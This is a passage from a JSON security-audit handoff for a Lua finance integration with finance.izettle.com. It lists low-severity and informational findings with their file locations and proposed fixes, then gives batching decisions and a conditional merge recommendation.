      "pr_type": "Held-for-review PR",
      "fix": "First-write-wins guard with German WARN log at each index build site"
    },
    "S-07": {
      "severity": "Low",
      "class": "Data Integrity",
      "summary": "Payout sort by timestamp is unstable; tied timestamps produce non-deterministic valueDate assignment",
      "file": "src/entry.lua:244",
      "pr_type": "Sec-PR batch",
      "fix": "Add UUID tiebreaker to make the sort stable"
    },
    "S-08": {
      "severity": "Low",
      "class": "Input Validation",
      "summary": "originatingTransactionUuid not pattern-validated; control-char UUIDs flow into transactionCode strings",
      "file": "src/finance.lua:36-37; src/mapping.lua:464, 531",
      "pr_type": "Sec-PR batch",
      "fix": "Add 8-4-4-4-12 hex pattern validation in parse_transaction; mappers inherit the guard"
    },
    "S-09": {
      "severity": "Low",
      "class": "Input Validation / Data Integrity",
      "summary": "Fee aggregate sums arbitrary fee amounts with no per-record or per-sum sanity cap",
      "file": "src/mapping.lua:503-507",
      "pr_type": "Sec-PR batch",
      "fix": "MAX_FEE_MINOR_UNITS per-record + MAX_AGG_MINOR_UNITS per-sum caps; discard out-of-range"
    },
    "S-10": {
      "severity": "Low",
      "class": "Input Validation / Data Integrity",
      "summary": "_berlin_date_to_posix regex rejects 5-digit-year dates; future-year fees silently dropped from aggregate",
      "file": "src/mapping.lua:343-347",
      "pr_type": "Sec-PR batch",
      "fix": "Tighten upstream date computation to clamp to 2020-2099 range OR loosen regex to ^%d+%-%d%d%-%d%d$"
    },
    "I-01": {
      "severity": "Info",
      "class": "Process / Test Hygiene",
      "summary": "META-03 walker omits spec/fixtures/; future fixture could leak forbidden string into a spec contract",
      "file": "spec/meta_no_tax_classification_spec.lua:74-99",
      "pr_type": "Backlog",
      "fix": "Extend walker to spec/fixtures/**/*.json"
    },
    "I-02": {
      "severity": "Info",
      "class": "UX / Compliance Communication",
      "summary": "Missing-READ:FINANCE-scope surfaces as generic LoginFailed; no German hint for v0.1.0 upgraders",
      "file": "src/finance.lua + src/errors.lua",
      "pr_type": "Backlog (Phase 5)",
      "fix": "Scope-specific German error string for 401 against finance.izettle.com; ADR-0004 already accepts deferral"
    }
  },
  "held_for_review": ["S-01", "S-05", "S-06"],
  "normal_batch": ["S-02", "S-03", "S-04", "S-07", "S-08", "S-09", "S-10"],
  "backlog": ["I-01", "I-02"],
  "launch_block": false,
  "recommendation": "Phase 4 is CONDITIONALLY CLEARED for merge. S-01 is the highest-severity finding (uncaught Lua error in RefreshAccount on adversarial groupedVatAmounts key) and should land before v0.2.0 ships — it is one defensive guard, low-risk to fix. S-05 (CI egress allowlist) and S-06 (cross-refresh index overwrites) are held-for-review because they touch the supply-chain and data-integrity contracts that future Phase 5/6 features will compound on. The remaining 7 findings are normal Sec-PR batch. No critical findings. SEC-03 fully compliant; Phase-3 surface fully preserved."
}
</orchestrator_handoff>
